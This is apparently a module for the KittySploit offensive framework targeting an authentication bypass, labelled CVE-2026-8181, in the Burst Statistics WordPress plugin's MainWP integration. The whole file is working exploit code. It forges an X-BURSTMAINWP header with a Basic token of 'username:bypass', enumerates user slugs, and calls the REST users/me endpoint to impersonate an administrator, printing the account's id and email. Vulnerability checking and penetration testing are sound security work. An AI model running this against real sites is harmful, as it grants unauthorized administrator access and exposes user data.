#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CVE-2026-8181 — verify Burst Statistics MainWP REST impersonation."""

from __future__ import annotations

import base64

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Auxiliary, Http_client, Wordpress):
    __info__ = {
        "name": "Burst Statistics CVE-2026-8181 MainWP auth bypass check",
        "description": "Reads /wp-json/wp/v2/users/me as administrator via X-BURSTMAINWP.",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-8181",
        "tags": ["wordpress", "burst-statistics", "auth-bypass", "cve-2026-8181"],
    }

    def _burst_headers(self, username: str) -> dict:
        user = (username or "admin").strip()
        token = base64.b64encode(f"{user}:bypass".encode()).decode()
        return {
            "X-BURSTMAINWP": "1",
            "Authorization": f"Basic {token}",
        }

    def run(self):
        candidates = ["admin"]
        candidates.extend(self.wp_enum_user_slugs(self.path))
        seen = set()
        for user in candidates:
            if not user or user in seen:
                continue
            seen.add(user)
            response = self.wp_rest_request(
                "GET",
                "/wp/v2/users/me?context=edit",
                headers=self._burst_headers(user),
            )
            if not response:
                continue
            try:
                data = response.json()
            except Exception:
                continue
            if isinstance(data, dict) and "administrator" in (data.get("roles") or []):
                print_success(
                    f"Impersonated id={data.get('id')} slug={user} email={data.get('email')}"
                )
                return True
        print_error("MainWP bypass probe failed")
        return False